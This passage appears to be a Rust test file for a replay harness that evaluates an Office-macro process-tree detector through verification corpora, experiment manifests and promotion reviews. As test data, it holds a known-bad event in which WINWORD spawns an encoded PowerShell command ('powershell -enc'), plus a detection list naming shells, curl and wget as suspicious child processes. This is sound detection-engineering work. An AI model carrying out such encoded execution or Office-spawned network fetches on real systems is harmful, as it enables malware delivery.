    let verification_path = write_verification(
        &verification_src_dir,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(&format!(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: {}
benign_controls:
  scenarios:
    - {}
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.05
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
            suite_path.display(),
            benign_path.display(),
        ))
        .unwrap(),
    );
    let experiment_path = write_experiment(
        &experiments_src_dir,
        "office-baseline-control.yaml",
        &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
            r#"
name: office_baseline_control
description: control candidate
corpus:
  suite: {}
verification:
  corpus: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: office_baseline_control
  description: candidate matches baseline
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: control
  rationale: preserve baseline behavior
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 10000
"#,
            suite_path.display(),
            verification_path.display(),
        ))
        .unwrap(),
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let verification = harness
        .evaluate_verification_path(&experiment_path, &verifications_dir)
        .await
        .unwrap();
    let shadow = harness
        .evaluate_shadow_path(&experiment_path, &shadows_dir)
        .await
        .unwrap();
    let review = harness
        .create_promotion_review_packet(
            &experiment_path,
            &verifications_dir,
            &verification.record.verification_id,
            &shadows_dir,
            &shadow.record.shadow_id,
            &reviews_dir,
        )
        .unwrap();

    assert_eq!(
        review.packet.recommendation,
        PromotionReviewRecommendation::ReadyForManualReview
    );
    assert!(review.packet.blocking_reasons.is_empty());
    assert!(render_promotion_review_packet(&review.packet).contains("Promotion Review Packet"));

    let reloaded = harness
        .load_promotion_review(&reviews_dir, &review.record.review_id)
        .unwrap()
        .unwrap();
    assert_eq!(reloaded.record.review_id, review.record.review_id);

    let _ = fs::remove_dir_all(root);
}

#[test]
fn verification_corpus_manifest_loads_and_validates() {
    let root = unique_temp_dir("verification-corpus");
    let corpus_path = write_verification(
        &root,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: ../scenario-suites/hellcat-office-v1.yaml
benign_controls:
  scenarios:
    - ../scenarios/benign-baseline.yaml
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.05
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
        )
        .unwrap(),
    );

    let manifest = load_verification_manifest(&corpus_path).unwrap();
    assert_eq!(manifest.name, "office_detector_safety_v1");
    assert_eq!(manifest.benign_controls.scenarios.len(), 1);
    assert_eq!(manifest.canonical_templates.len(), 1);
    assert_eq!(manifest.resource_budgets.max_false_positive_rate, 0.05);
    assert_eq!(manifest.resource_budgets.max_detect_latency_us, 10000);

    let _ = fs::remove_dir_all(root);
}

#[test]
fn replay_scenario_manifest_round_trips_through_yaml() {
    let manifest = scenario_manifest();
    let encoded = serde_yaml::to_string(&manifest).unwrap();
    let decoded: ReplayScenarioManifest = serde_yaml::from_str(&encoded).unwrap();

    assert_eq!(decoded.name, manifest.name);
    assert_eq!(decoded.description, manifest.description);
    assert_eq!(decoded.metadata, manifest.metadata);
    assert_eq!(decoded.expectations, manifest.expectations);
}

#[test]
fn replay_suite_manifest_round_trips_through_yaml() {
    let manifest = ReplaySuiteManifest {
        name: "office_suite".to_string(),
        description: "office replay suite".to_string(),
        corpus_version: "v1".to_string(),
        metadata: ReplaySuiteMetadata {
            campaign: Some("hellcat.office_loader".to_string()),
            techniques: vec!["T1204.002".to_string()],
            tags: vec!["office".to_string()],
        },
        scenarios: vec![
            "scenarios/office-dropper.yaml".to_string(),
            "scenarios/office-benign.yaml".to_string(),
        ],
    };

    let encoded = serde_yaml::to_string(&manifest).unwrap();
    let decoded: ReplaySuiteManifest = serde_yaml::from_str(&encoded).unwrap();
    assert_eq!(decoded.name, "office_suite");
    assert_eq!(decoded.metadata, manifest.metadata);
    assert_eq!(decoded.scenarios.len(), 2);
}
